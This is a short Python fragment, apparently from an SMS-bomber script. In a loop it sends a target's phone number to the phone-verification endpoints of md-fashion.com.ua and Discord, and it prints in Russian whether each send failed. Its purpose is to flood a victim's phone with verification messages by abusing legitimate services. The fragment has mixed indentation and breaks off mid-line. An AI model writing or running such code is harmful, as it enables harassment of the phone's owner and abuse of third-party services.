...
for _ in track(range(run)):
    ...
    try:
			requests.post('https://md-fashion.com.ua/bpm/validate-contact', data={'phone':'+' + number})
            print('md-fashion.com.ua')
    except:
            print('Не отправлено (md-fashion.com.ua)')
    try:
			requests.post('https://discord.com/api/v9/auth/register/phone', json={'phone': '+' + number})
            print('discord.com')
    except:
            print('Не отправлено (discord.com)')
    try:#numberis
